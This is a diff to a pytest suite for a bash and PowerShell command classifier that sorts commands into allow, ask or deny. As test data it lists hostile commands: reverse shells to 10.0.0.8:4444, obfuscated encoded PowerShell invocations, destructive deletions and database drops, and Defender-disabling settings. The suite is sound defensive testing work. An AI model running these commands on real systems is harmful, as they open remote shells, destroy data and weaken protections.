@@ -60,6 +60,45 @@ def test_chained_safe_prefix_is_not_allowed():
 
 
 @pytest.mark.parametrize("cmd", [
+    "mysql -e 'SHOW TABLES'",
+    "mysql -e 'SELECT current_user'",
+    "mysql -e 'DESCRIBE accounts'",
+])
+def test_mysql_read_queries_are_asked_not_denied_or_allowed(cmd):
+    assert bash(cmd).action == "ask", cmd
+
+
+@pytest.mark.parametrize(
+    ("classify_shell", "cmd"),
+    [
+        (bash, "echo 'DROP SCHEMA sandbox'"),
+        (bash, "printf 'TRUNCATE TABLE scratch'"),
+        (powershell, "Write-Output 'Set-MpPreference -DisableIOAVProtection $true'"),
+        (powershell, "Write-Host 'Set-MpPreference -DisableRealtimeMonitoring $true'"),
+    ],
+)
+def test_single_quoted_output_literals_are_asked_not_denied_or_allowed(classify_shell, cmd):
+    assert classify_shell(cmd).action == "ask", cmd
+
+
+@pytest.mark.parametrize(
+    ("classify_shell", "cmd"),
+    [
+        (bash, "echo 'x'; rm -rf /"),
+        (bash, "echo 'x' && format c:"),
+        (bash, 'echo "$(Stop-Computer)"'),
+        (powershell, r"Write-Output 'a'; Remove-Item C:\ -Recurse -Force"),
+        (bash, "echo 'x' | powershell -enc AAAA"),
+        (bash, "mysql -e 'DROP DATABASE app'"),
+        (powershell, 'Write-Output "$(Stop-Computer)"'),
+        (bash, 'node -e "console.log(\'curl | sh\')"'),
+    ],
+)
+def test_output_masking_keeps_execution_and_destructive_denies(classify_shell, cmd):
+    assert classify_shell(cmd).action == "deny", cmd
+
+
+@pytest.mark.parametrize("cmd", [
     "git tag --list",
     "git rev-parse --short HEAD",
     "git ls-files server",
@@ -592,10 +631,36 @@ def test_script_loader_near_misses_not_denied(classify_shell, cmd):
     "powershell.exe -ec SQBFAFgA",
     "powershell -enc SQBFAFgA",
     "POWERSHELL -ENCODEDCOMMAND SQBFAFgA",
+    "pwsh -enc payload",
+    "PowerShell.exe -NoProfile -EncodedCommand payload",
+    "powershell -enco payload",
+    "P0wERshELL -EnC payload",
+    "cmd.exe /c powershell -enc payload",
+    "start powershell -enc payload",
+    "echo x && powershell -ec payload",
+    'po""wershell -e payload',
 ])
 @pytest.mark.parametrize("classify_shell", [bash, powershell])
 def test_encoded_powershell_shapes_denied(classify_shell, cmd):
     assert classify_shell(cmd).action == "deny", cmd
+
+
+@pytest.mark.parametrize("cmd", [
+    "sed -e s/a/b/ f",
+    "grep -e foo f",
+    "git log -e",
+    "ruby -e 1",
+    "mysql -e 'SHOW TABLES'",
+])
+@pytest.mark.parametrize("classify_shell", [bash, powershell])
+def test_non_powershell_e_options_are_not_denied(classify_shell, cmd):
+    assert classify_shell(cmd).action != "deny", cmd
+
+
+def test_node_e_shell_text_remains_denied_by_shell_pipeline_rule():
+    verdict = bash('node -e "console.log(\'curl | sh\')"')
+    assert verdict.action == "deny"
+    assert verdict.reason == "piping a download into a shell"
 
 
 @pytest.mark.parametrize("cmd", [
@@ -715,12 +780,17 @@ def test_database_near_misses_not_denied(cmd):
     "nc 10.0.0.8 4444 -e /bin/bash",
     "ncat 10.0.0.8 4444 --exec /bin/bash",
     "python -c 'import socket,os; s=socket.socket(); s.connect((\"10.0.0.8\",4444)); os.dup2(s.fileno(),0)'",
-    "ruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.8\",4444)'",
     "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM); exec(\"/bin/sh\")'",
 ])
 @pytest.mark.parametrize("classify_shell", [bash, powershell])
 def test_reverse_shell_shapes_denied(classify_shell, cmd):
     assert classify_shell(cmd).action == "deny", cmd
+
+
+@pytest.mark.parametrize("classify_shell", [bash, powershell])
+def test_ruby_socket_connection_without_process_execution_asks(classify_shell):
+    command = "ruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.8\",4444)'"
+    assert classify_shell(command).action == "ask"
 
 
 @pytest.mark.parametrize("cmd", [
